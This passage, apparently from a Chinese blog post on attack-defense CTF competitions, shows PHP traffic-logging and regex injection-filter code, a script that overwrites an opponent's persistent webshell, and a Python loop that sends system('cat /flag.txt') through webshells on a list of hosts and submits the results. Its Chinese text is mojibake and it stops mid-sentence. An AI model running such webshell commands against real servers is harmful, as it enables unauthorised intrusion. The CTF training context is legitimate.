å¾ªç¯è·å–æ‰€æœ‰çš„å¤´ä¿¡æ¯</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> \n<span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å°†å¤´ä¿¡æ¯çš„åç§°æ›¿æ¢ä¸ºå°å†™ï¼Œå¹¶å°†ä¸‹åˆ’çº¿æ›¿æ¢ä¸ºç©ºæ ¼</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å– get å‚æ•° </span>\n<span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å– post å‚æ•°</span>\n<span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å– cookie å‚æ•°</span>\n<span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–æ‰€æœ‰çš„å¤´ä¿¡æ¯</span>\n<span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–æ‰€æœ‰çš„ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–å®¢æˆ·ç«¯ ip</span>\n<span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–è¯·æ±‚æ–¹å¼</span>\n<span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–æ–‡ä»¶è·¯å¾„</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// å¾ªç¯è·å–æ‰€æœ‰çš„ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span>\n<span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å–æ–‡ä»¶å†…å®¹</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å†™å…¥æ–‡ä»¶</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åˆ é™¤å¤´ä¿¡æ¯ä¸­çš„ Accept</span>\n<span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Get\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Post\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Cookie\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Header\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å°†æ‰€æœ‰çš„å‚æ•°åˆå¹¶æˆä¸€ä¸ªæ•°ç»„</span>\n\n<span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è°ƒç”¨æ—¥å¿—å‡½æ•°</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// æ—¥å¿—å‡½æ•°</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å–å®¢æˆ·ç«¯ ip</span>\n<span class=\"token variable\">$LOG_FILENAME</span> <span class=\"token operator\">=</span> <span class=\"token constant\">LOG_FILEDIR</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// æ—¥å¿—æ–‡ä»¶è·¯å¾„</span>\n<span class=\"token variable\">$time</span> <span class=\"token operator\">=</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d G:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å–å½“å‰æ—¶é—´</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å†™å…¥æ—¥å¿—æ–‡ä»¶</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_HOST'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'?'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å†™å…¥æ—¥å¿—æ–‡ä»¶</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n***************************************************************\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å†™å…¥æ—¥å¿—æ–‡ä»¶</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¦‚æœå¯ä»¥æˆ‘ä»¬è¿˜å¯ä»¥ä¸Šé€šé˜²ï¼ˆä¸€èˆ¬éƒ½æ˜¯ä¸è¡Œï¼‰</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">&lt;!-- \nrequire_once('waf.php')\n\nPHPCMS V9 \\phpcms\\base.php\nPHPWIND8.7 \\data\\sql_config.php\nDEDECMS5.7 \\data\\common.inc.php\nDiscuzX2   \\config\\config_global.php\nWordpress   \\wp-config.php\nMetinfo   \\include\\head.php\n--></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">customError</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;b>Error number:&lt;/b> [<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>],error on line <span class=\"token interpolation\"><span class=\"token variable\">$errline</span></span> in <span class=\"token interpolation\"><span class=\"token variable\">$errfile</span></span>&lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"customError\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$getfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"'|(and|or)\\\\b.+?(>|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$postfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|>|&lt;|\\\\bin\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cookiefilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1.6&#125;?(=|>|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltKey</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ArrFiltReq</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$StrFiltValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ArrFiltReq</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/is\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//slog (\"&lt;br>&lt;br > æ“ä½œ IP:\".$_SERVER [\"REMOTE_ADDR\"].\"&lt;br > æ“ä½œæ—¶é—´:\".strftime (\"% Y-% m-% d % H:% M:% S\").\"&lt;br > æ“ä½œé¡µé¢:\".$_SERVER [\"PHP_SELF\"].\"&lt;br > æäº¤æ–¹å¼:\".$_SERVER [\"REQUEST_METHOD\"].\"&lt;br > æäº¤å‚æ•°:\".$StrFiltKey.\"&lt;br > æäº¤å‚æ•°:\".$StrFiltValue);</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"360WebSec notice: Illegal operation!\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$getfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$postfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cookiefilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\"># code...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">slog</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$logs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$toppath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"DOCUMENT_ROOT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/log.htm\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$Ts</span><span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$toppath</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"a+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$logs</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¯¹äºåˆ«äººä¸Šä¼ è¿‡æ¥çš„ä¸æ­»é©¬è¿›è¡Œå¤„ç†</p>\n<ul>\n<li>æ€æ­»è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ ps aux å‘½ä»¤ åˆ—å‡ºæ‰€æœ‰è¿›ç¨‹ï¼Œæ‰¾åˆ°è¦æ€æ‰çš„è¿›ç¨‹è¿ç”¨å‘½ä»¤ï¼Œkill pid å°±å¯ä»¥äº†</li>\n<li>é€šè¿‡æ¡ä»¶ç«äº‰å†™å…¥æ— æ•ˆå†…å®¹æˆ–è€…åˆ é™¤ä¸æ­»é©¬æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼ˆç«äº‰å†™å…¥æ— å…³å†…å®¹ï¼Œconfig æ˜¯æœ¨é©¬åï¼‰</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'???'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å½“ç„¶æœ€å¥½çš„é˜²å¾¡è¿˜æ˜¯æ”»å‡»</p>\n<h2 id=\"åˆ©ç”¨æ¼æ´æ”»å‡»\"><a class=\"anchor\" href=\"#åˆ©ç”¨æ¼æ´æ”»å‡»\">#</a> åˆ©ç”¨æ¼æ´æ”»å‡»</h2>\n<p>d ç›¾æ‰«å‡ºæ¥çš„ shell åªè¦æ‰‹å¿«è¿˜æ˜¯å¯ä»¥å…ˆæ‰“ä¸€æ³¢çš„ï¼Œå¯ä»¥åœ¨èµ›å‰æå‰å†™å¥½ç®€å•çš„ shell åˆ©ç”¨æ‰¹é‡åŒ–è„šæœ¬</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> fontTools<span class=\"token punctuation\">.</span>afmLib\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> url1<span class=\"token punctuation\">:</span>\n    data<span class=\"token operator\">=</span>url1<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npaylaod2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\nheader2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#å¹³å° url</span>\nurl2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        urlpro<span class=\"token operator\">=</span><span class=\"token string\">\"http://&#123;&#125;/.a.php?c=system('cat /flag.txt');\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        res<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>urlpro<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(urlpro)</span>\n        p<span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post è¯·æ±‚</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å½“ç„¶è¿™æ ·å¯èƒ½åªèƒ½æ‹¿åˆ°ä¸€è½®çš„åˆ†æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 